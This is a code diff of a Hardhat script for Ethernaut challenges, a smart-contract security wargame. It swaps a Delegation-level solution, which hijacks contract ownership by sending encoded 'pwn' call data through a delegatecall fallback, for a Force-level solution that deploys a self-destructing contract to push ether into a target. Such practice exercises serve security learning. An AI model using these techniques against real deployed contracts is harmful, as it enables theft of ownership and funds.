@@ -3,26 +3,10 @@ import { ethers } from "hardhat";
 const ETHERNAUT_ADDRESS = "";
 
 async function main() {
-  // Get Address on the private key
-  const deployers = await ethers.getSigners();
-  console.log("Deployer address is", deployers[0].address);
-
-  // Get the Delegate contract
-  const Delegate = await ethers.getContractFactory("Delegate");
-
-  // Get the Ethernaut Delegation contract
-  const Delegation = await ethers.getContractFactory("Delegation");
-  const delegation = await Delegation.attach(ETHERNAUT_ADDRESS);
-  console.log("Attach Delegation contract at", delegation.address);
-
-  // Get the encode function data
-  const encodeFx = Delegate.interface.encodeFunctionData("pwn", []);
-  const data = ethers.utils.hexlify(encodeFx);
-
-  // Change the owner
-  const fallbackTx = await delegation.fallback({ data, gasLimit: 1000000 });
-  await fallbackTx.wait();
-  console.log("Fallback transaction mined at", fallbackTx.hash);
+  // Get, destroy and send to the Ethernaut contract
+  const Destroyable = await ethers.getContractFactory("Destroyable");
+  const destroyable = await Destroyable.deploy(ETHERNAUT_ADDRESS, { value: ethers.utils.parseEther("0.0001") });
+  console.log("Deploy Destroyable contract at", destroyable.address);
 }
 
 main().catch((error) => {
